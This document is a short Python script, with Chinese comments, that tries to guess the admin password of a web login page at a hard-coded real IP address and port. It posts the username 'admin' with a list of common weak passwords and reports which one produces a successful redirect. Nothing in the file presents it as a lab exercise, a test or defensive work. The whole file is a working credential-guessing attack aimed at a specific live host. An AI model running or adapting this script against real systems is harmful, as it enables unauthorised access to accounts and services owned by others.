import requests

# 定义请求的URL和数据
base_url = "http://8.138.59.234:9001"
login_url = base_url + "/postLogin"

# 定义请求头
headers = {
    "Cache-Control": "max-age=0",
    "Accept-Language": "zh-CN",
    "Upgrade-Insecure-Requests": "1",
    "Origin": base_url,
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": base_url + "/login",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive"
}

# 预设密码列表（原文）
passwords = ["admin123", "admin","123456", "test"]

# 尝试每个密码
for password in passwords:
    data = {
        "username": "admin",
        "password": password
    }

    with requests.Session() as session:
        response = session.post(login_url, data=data, headers=headers, allow_redirects=False)

        if response.status_code == 302:
            location = response.headers.get('Location')
            if location and location.startswith(base_url):
                print(f"登录成功，密码为: {password}")
                break  # 登录成功后退出循环
            else:
                print(f"登录失败，密码: {password}不正确")
        else:
            print(f"请求失败，状态码: {response.status_code}")
